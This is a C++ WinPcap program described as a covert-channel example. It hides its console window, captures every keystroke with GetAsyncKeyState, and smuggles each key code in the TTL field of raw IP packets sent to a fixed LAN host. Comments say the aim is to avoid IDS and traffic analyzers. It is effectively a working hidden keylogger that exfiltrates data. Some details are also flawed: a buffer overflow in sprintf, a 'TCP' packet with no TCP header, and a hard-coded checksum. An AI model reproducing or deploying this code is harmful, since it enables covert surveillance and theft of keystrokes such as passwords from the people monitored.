#include <stdio.h>
#include <time.h>
#include <pcap.h>
#include <iostream>
using namespace std;
//Useful Reference: Winpcap Examples from the Winpcap Website (WpdPack_4_0_2 File)
//Listing Here Some Common Fields To Exploit it To Pass Covert Channels
int main()
{	    
    
	u_char packet[34];//All The Fileds We Used //Packet With No Data // You Can Expand It!
	pcap_if_t *alldevs;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_if_t *d;
	pcap_t *adhandle;
	int inum;
	int i=0;

	/* Retrieve the device list */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	
	/* Print the list */
	for(d=alldevs; d; d=d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if(i==0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}
	
	printf("Enter the interface number (1-%d):",i);
	//scanf("%d", &inum); //if necessary
	inum=1;
	
	if(inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);
	
	/* Open the adapter */
	if ( (adhandle= pcap_open(d->name,	// name of the device
							 65536,		// portion of the packet to capture. 
										// 65536 grants that the whole packet will be captured on all the MACs.
							 PCAP_OPENFLAG_PROMISCUOUS,			// promiscuous mode
							 1000,		// read timeout
							 NULL,		// remote authentication
							 errbuf		// error buffer
							 ) ) == NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter. %s is not supported by WinPcap\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}
	
    
	printf("\nPacket Sending...\n");
	
	//////////////////////////////////////////////////////////
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';
	char hex[1];	
	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {				
				//printf("----------",KEY,"End");												    

							sprintf(hex, "%02X", KEY);
														
							u_char c = strtoul(hex, NULL, 16);
							printf("(Char:%c Hex: %0x)\t",c,KEY);																															

	//////////////////////////////////////////////////////////



	////////////////////////// Ethernet //////////////////////
	//MAC Address For Our DST: 00:0c:29:cc:1a:23
	//Note: Filled Out According To Your Studied Condition
    packet[0] = 0x00;
    packet[1] = 0x0C;
    packet[2] = 0x29;
    packet[3] = 0xCC;
    packet[4] = 0x1A;
    packet[5] = 0x23;

	//MAC Address For This Device: 00-0C-29-10-E5-B6    
	//Note: Filled Out According To Your Studied Condition
    packet[6]  = 0x00;
    packet[7]  = 0x0C;
    packet[8]  = 0x29;
    packet[9]  = 0x10;
    packet[10] = 0xE5;
    packet[11] = 0xB6;
    
	//IP Header
	//Common Status
	packet[12] = 0x08;
	packet[13] = 0x00;
	
	////////////////////////// IP //////////////////////
	packet[14]= 0x45; // Version & Header Length 

	//Common Status
	packet[15]= 0x04; // TOS			

	//Note: Filled Out According To Your Studied Condition	
	packet[16]= 0x00; // Total Length: 20 byte
	packet[17]= 0x14; // Total Length: 20 byte
	
	//Note: Filled Out According To Your Studied Condition // Maybe Contain Covert Channel 
	packet[18]= 0x00; // ID
	packet[19]= 0x00; // ID	

	packet[20]= 0x40; // Flags + Fragment Offset
	packet[21]= 0x00; // Flags + Fragment Offset

	//packet[22]= 0x41; // TTL		     	
	packet[22]= c;// TTL		     

	packet[23]= 0x06; // Protocol: TCP

	//Checksum Must Be Caluclated in a Right Way to Avoid Dropping the Packet by IDS or Alerting by Network Traffic Analyzers
	//Note: Filled Out According To Your Studied Condition // Maybe Contain Covert Channel
	packet[24]= 0x93; // Check Sum
	packet[25]= 0x19; // Check Sum
	
	//Note: Filled Out According To Your Studied Condition
	packet[26]= 0xC0; // SRC IP: 192
	packet[27]= 0xA8; // SRC IP: 168
	packet[28]= 0x12; // SRC IP: 18	
	packet[29]= 0xAD; // SRC IP: 173

	//Note: Filled Out According To Your Studied Condition
	packet[30]= 0xC0; // DST IP: 192
	packet[31]= 0xA8; // DST IP: 168
	packet[32]= 0x12; // DST IP: 18
	packet[33]= 0xB5; // DST IP: 171
	
	//pcap_sendpacket(adhandle , packet , 54);//54 Is The Length Of The Packet
	pcap_sendpacket(adhandle , packet , 34);//34 Is The Length Of The Packet
	}
	}
	}
	return 0;
}
